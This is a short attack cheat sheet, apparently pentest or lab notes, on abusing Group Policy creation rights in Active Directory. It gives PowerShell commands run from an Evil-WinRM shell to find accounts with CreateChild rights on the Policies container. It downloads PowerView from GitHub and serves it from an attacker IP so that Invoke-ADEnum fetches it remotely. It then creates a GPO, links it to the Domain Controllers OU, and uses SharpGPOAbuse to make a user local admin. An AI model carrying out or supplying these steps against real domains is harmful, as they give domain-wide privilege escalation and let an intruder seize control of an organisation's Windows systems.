# GPO Create Premission

```powershell
*Evil-WinRM* PS C:\mane1> Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=MANE,DC=DC" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN=Policies,CN=System,DC=MANE,DC=DC
ActiveDirectoryRights : CreateChild
SecurityIdentifier    : S-1-5-21-3174020193-2022906219-3623556448-1104
```

and see who user can add: 

```powershell
$SID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-3174020193-2022906219-3623556448-1104")
$objUser = $SID.Translate([System.Security.Principal.NTAccount])
$objUser.Value
```

## Script Check

use: https://github.com/Leo4j/Invoke-ADEnum/tree/main?tab=readme-ov-file

```powershell
wget https://raw.githubusercontent.com/Leo4j/Tools/main/PowerView_Mod.ps1 
python3 -m http.server 2222

Invoke-ADEnum -CustomURL http://10.10.16.2:2222/PowerView_Mod.ps1 -GPOsRights 
```

## Create GPO

```powershell

New-GPO -Name privesc -Comment "Privilege Escalation"
New-GPLink -Name privesc -Target "OU=Domain Controllers,DC=mane,DC=dc" -LinkEnabled Yes
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount mane --gponame privesc
gpupdate /force
```